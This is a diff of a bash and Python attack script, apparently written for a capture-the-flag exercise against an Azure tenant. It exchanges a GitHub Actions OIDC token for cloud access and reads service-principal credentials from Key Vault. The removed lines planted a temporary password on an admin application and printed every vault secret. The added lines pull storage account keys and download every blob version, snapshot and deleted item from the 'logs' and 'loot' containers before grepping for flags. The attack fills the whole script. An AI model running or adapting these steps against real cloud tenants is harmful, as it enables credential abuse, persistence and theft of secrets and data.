@@ -1,12 +1,12 @@
 #!/usr/bin/env bash
 set -uo pipefail
 python3 - <<'PYEOF'
-import os, json, time, base64, urllib.request, urllib.parse
-def http(url, data=None, headers=None, method=None, js=None):
+import os, json, urllib.request, urllib.parse
+def http(url, data=None, headers=None, method=None):
     h=dict(headers or {}); body=None
-    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
-    elif isinstance(data, dict):
+    if isinstance(data, dict):
         body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
+    elif data==b"": body=b""; h.setdefault("Content-Length","0")
     req=urllib.request.Request(url, data=body, headers=h, method=method)
     try:
         with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
@@ -15,10 +15,7 @@ def http(url, data=None, headers=None, method=None, js=None):
 def jg(b):
     try: return json.loads(b)
     except Exception: return {}
-def claims(t):
-    p=t.split(".")[1]; p+="="*(-len(p)%4); return json.loads(base64.urlsafe_b64decode(p))
 TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
-G="https://graph.microsoft.com/v1.0"
 st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
           headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
 IDT=json.loads(b)["value"]
@@ -31,57 +28,49 @@ st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-princ
 c=json.loads(jg(b)["value"])
 st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
   {"client_id":c["appId"],"client_secret":c["clientSecret"],
-   "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
-HS={"Authorization":"Bearer "+jg(b)["access_token"]}
-
-print("### CLEANUP: remove every 'ci-temp' credential")
-st,b=http(f"{G}/applications?$select=" + urllib.parse.quote("id,displayName,passwordCredentials"), headers=HS)
-for a in jg(b).get("value",[]):
-    for pc in a.get("passwordCredentials",[]) or []:
-        if pc.get("displayName")=="ci-temp":
-            st2,b2=http(f"{G}/applications/{a['id']}/removePassword", headers=HS, method="POST", js={"keyId":pc["keyId"]})
-            print(f"   {a['displayName']:26} keyId {pc['keyId'][:8]} -> remove {st2}")
-st,b=http(f"{G}/applications?$select=" + urllib.parse.quote("id,displayName,passwordCredentials"), headers=HS)
-left=[(a["displayName"],pc["keyId"]) for a in jg(b).get("value",[]) for pc in (a.get("passwordCredentials") or []) if pc.get("displayName")=="ci-temp"]
-print("   remaining ci-temp creds:", left)
-
-print("\n### retry tbl-legacy-admin with full propagation wait")
-OBJ="22a3fb7e-860a-4708-9e50-3d36aa21191c"; APPID="891fb158-e02c-4428-a885-53b811f369c0"
-kid=None
-try:
-    st,b=http(f"{G}/applications/{OBJ}/addPassword", headers=HS, method="POST",
-              js={"passwordCredential":{"displayName":"ci-temp"}})
-    pc=jg(b); kid=pc.get("keyId"); sec=pc.get("secretText")
-    print("   addPassword", st)
-    for wait in (30,30,30):
-        time.sleep(wait)
-        ok=True
-        for scope,lbl in (("https://graph.microsoft.com/.default","graph"),
-                          ("https://vault.azure.net/.default","kv"),
-                          ("https://management.azure.com/.default","arm")):
-            st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
-                      {"client_id":APPID,"client_secret":sec,"scope":scope,"grant_type":"client_credentials"})
-            t=jg(b).get("access_token")
-            if not t: print(f"   {lbl}: no token yet"); ok=False; continue
-            cl=claims(t)
-            if lbl=="graph": print("   graph roles:", cl.get("roles"), "wids:", cl.get("wids"))
-            if lbl=="kv":
-                for v in ("kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"):
-                    st2,b2=http(f"https://{v}.vault.azure.net/secrets?api-version=7.4", headers={"Authorization":"Bearer "+t})
-                    print(f"     {v}: {st2}")
-                    if st2==200:
-                        for s in jg(b2).get("value",[]):
-                            nm=s["id"].rsplit("/",1)[-1]
-                            st3,b3=http(s["id"]+"?api-version=7.4", headers={"Authorization":"Bearer "+t})
-                            print(f"        >>> {nm} = {jg(b3).get('value','')}")
-            if lbl=="arm":
-                st2,b2=http(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",
-                            headers={"Authorization":"Bearer "+t})
-                print("     arm resources:", st2, len(jg(b2).get("value",[])))
-        if ok: break
-finally:
-    if kid:
-        st,b=http(f"{G}/applications/{OBJ}/removePassword", headers=HS, method="POST", js={"keyId":kid})
-        print("   final cleanup:", st)
+   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
+ARM=jg(b)["access_token"]
+st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
+          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
+          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
+open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
 PYEOF
+
+KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
+CS="DefaultEndpointsProtocol=https;AccountName=$ACCT;AccountKey=$KEY;EndpointSuffix=core.windows.net"
+
+echo "### blob service properties (versioning / soft delete)"
+az storage account blob-service-properties show --account-name "$ACCT" -g rg-tbl-platform-prod-sea \
+   --query "{versioning:isVersioningEnabled,delRetention:deleteRetentionPolicy,containerDel:containerDeleteRetentionPolicy}" -o json 2>&1 | head -20
+
+for C in logs loot; do
+  echo
+  echo "### container $C : ALL (versions + snapshots + deleted + metadata)"
+  az storage blob list -c "$C" --connection-string "$CS" --include dvs \
+     --query "[].{n:name,ver:versionId,snap:snapshot,del:deleted,size:properties.contentLength}" -o tsv 2>&1 | head -60
+done
+
+echo
+echo "### deleted containers"
+az storage container list --connection-string "$CS" --include-deleted --query "[].{n:name,del:deleted,ver:version}" -o tsv 2>&1 | head -20
+
+echo
+echo "### download every version/snapshot and grep"
+mkdir -p /tmp/all
+for C in logs loot; do
+  az storage blob list -c "$C" --connection-string "$CS" --include dvs --query "[].[name,versionId]" -o tsv 2>/dev/null | \
+  while IFS=$'\t' read -r N V; do
+    [ -z "$N" ] && continue
+    F="/tmp/all/$(echo "${C}_${N}_${V}" | tr '/:.' '___')"
+    if [ "$V" = "None" ] || [ -z "$V" ]; then
+      az storage blob download -c "$C" -n "$N" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
+    else
+      az storage blob download -c "$C" -n "$N" --version-id "$V" --connection-string "$CS" -f "$F" --overwrite -o none 2>/dev/null
+    fi
+  done
+done
+ls -la /tmp/all | head -30
+echo "--- grep"
+grep -raoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,250}\}' /tmp/all 2>/dev/null | sort -u | head -20
+rm -f /tmp/stkey
 echo "=== done ==="
